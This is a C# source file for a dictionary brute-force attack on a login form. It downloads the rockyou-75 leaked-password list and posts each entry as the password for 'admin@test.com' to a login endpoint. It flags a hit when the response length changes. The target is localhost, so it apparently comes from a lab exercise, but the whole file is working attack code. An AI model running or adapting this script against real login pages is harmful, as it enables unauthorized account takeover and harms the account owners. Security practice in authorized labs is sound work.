/*

https://raw.githubusercontent.com/danielmiessier/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt

http://localhost:5062/Authentication/index

Need Username / Password

Import Flurl.Http library

vars for target URL, rockyou list url, previousResponse length, rock you list file path, var for username

Check to see if rock you list already exists

if not exists
    download file (Flurl library, read response, save response as file)

read passwords into an array

for each password in password

    POST method using username / password
    read length and compare to previousLength
        if they're not equal and previousLength !=0, then we have a winner!
    
    previous length = response length

*/

using Flurl.Http;

internal class Program
{
    private static async Task Main(string[] args)
    {
        var username = "admin@test.com"; //args[0];

        var targetUrl = "http://localhost:5062/Authentication/index";
        var rockYouUrl = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt";
        var previousResponseLength = 0;

        var passwordFilePath = Path.Combine(Directory.GetCurrentDirectory(), "rockyou-75.txt");

        if (!File.Exists(passwordFilePath))
        {
            var fileData = await rockYouUrl.GetStringAsync();
            await File.WriteAllTextAsync(passwordFilePath, fileData);
        }

        var passwords = await File.ReadAllLinesAsync(passwordFilePath);

        foreach (var password in passwords)
        {
            var data = new { Username = username, Password = password };
            string responseText = "";

            try
            {
                // Make the request and read the response string
                responseText = await targetUrl.PostUrlEncodedAsync(data).ReceiveString();
            }
            catch (FlurlHttpException ex)
            {
                // This catches 401, 400, 500, etc., and extracts the error response text
                responseText = await ex.GetResponseStringAsync() ?? "";
            }

            Console.WriteLine($"The password used was {password} and it generated {responseText.Length} characters.");

            if (responseText.Length != previousResponseLength && previousResponseLength !=0)
            {
                Console.WriteLine($"Found password: {password}");
                Console.ReadLine();
                break;
            }

            previousResponseLength = responseText.Length;
        }
    }
}